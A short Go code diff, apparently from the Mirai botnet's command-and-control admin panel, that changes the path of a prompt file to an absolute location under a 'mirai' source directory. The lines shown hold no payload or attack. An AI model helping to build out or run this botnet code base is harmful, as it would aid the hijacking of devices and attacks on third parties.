@@ -25,7 +25,7 @@ func (this *Admin) Handle() {
         this.conn.Write([]byte("\033[?1049l"))
     }()
 
-    headerb, err := ioutil.ReadFile("prompt.txt")
+    headerb, err := ioutil.ReadFile("/home/user/src/mirai/prompt.txt")
     if err != nil {
         return
     }
